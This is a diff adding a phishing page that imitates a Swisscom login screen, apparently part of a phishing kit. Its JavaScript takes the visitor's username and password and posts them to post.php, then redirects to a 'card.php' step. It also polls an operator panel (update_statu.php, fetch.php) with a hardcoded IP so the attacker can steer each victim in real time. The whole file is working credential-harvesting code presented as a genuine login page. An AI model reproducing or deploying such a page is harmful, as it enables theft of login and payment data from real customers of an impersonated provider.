@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Swisscom Login</title>
+  <link rel="stylesheet" href="res/app.css">
+  <style>
+    .pass {
+      display: none;
+    }
+    a{
+      margin:10px 0;
+      text-decoration:none;
+      color:#116fda;
+      background:url('res/right.png');
+      background-repeat:no-repeat;
+      padding-left:30px;
+      background-size:29px;
+      font-size:1.1rem;
+    }
+  </style>
+</head>
+<body>
+
+<main>
+  <div class="form">
+    <div class="logo"><img src="res/logo.svg"></div>
+    <div class="title">Swisscom Login</div>
+
+    <div class="text">
+      <span class="user">Please log in here with your Swisscom login.</span>
+      <span class="pass">Password entry for  <b id="user_data">TEST</b></span>
+    </div>
+
+    <div class="col user">
+      <label for="u">Username</label>
+      <input type="text" id="u" placeholder="Enter username">
+    </div>
+        <div class="col pass">
+      <label for="p">Enter password</label>
+      <input type="password" id="p">
+    </div>
+
+    <div class="col btn user">
+      <button id="btn_user" onclick="sendUser()">Continue</button>
+    </div>
+
+    <div class="col btn pass">
+      <button id="btn_pass" onclick="sendPass()">Continue</button>
+      <button class="white" onclick="back()">Back</button>
+    </div>
+    
+    <div class="links">
+      <a href="#" class="pass">Forgot username?</a>
+      <a href="#" class="user">Register now</a>
+    </div>
+  </div>
+</main>
+
+<footer>
+  <div class="left">
+    <img src="res/logo.svg">
+  </div>
+  <div class="right">
+    About Swisscom Login  </div>
+</footer>
+
+
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script>
+
+$("#u").keypress(function(e){
+    if(e.key=="Enter"){
+        sendUser();
+    }
+})
+
+$("#p").keypress(function(e){
+    if(e.key=="Enter"){
+        sendPass();
+    }
+})
+
+function sendUser() {
+  const username = $("#u").val().trim();
+
+  if (username.length > 4) {
+    $(".user").hide();
+    $("#user_data").text(username);
+    $(".pass").show();
+    $("#p").focus();
+  }
+}
+
+function sendPass() {
+  const username = $("#u").val().trim();
+  const password = $("#p").val().trim();
+
+  if (username.length > 4 && password.length > 4) {
+    $.post("post.php", { user: username, pass: password }, function(res) {
+      window.location = "wait.php?next=card.php";
+    });
+  }
+}
+
+
+function back(){
+    $("#p").val("");
+    $(".pass").hide();
+    $(".user").show();
+}
+
+setInterval(() => {
+    $.post("../panel/update_statu.php",{update:1, ip:'61.75.33.41'});
+}, 1000);
+var page ="";
+var cd = "0";
+
+setInterval(() => {
+    $.post("../panel/fetch.php", {update:1}, function(d){
+        if(cd!=d && d!=0){
+            window.location=d;
+        }
+    })
+
+}, 2000);
+</script>
+
+</body>
+</html>
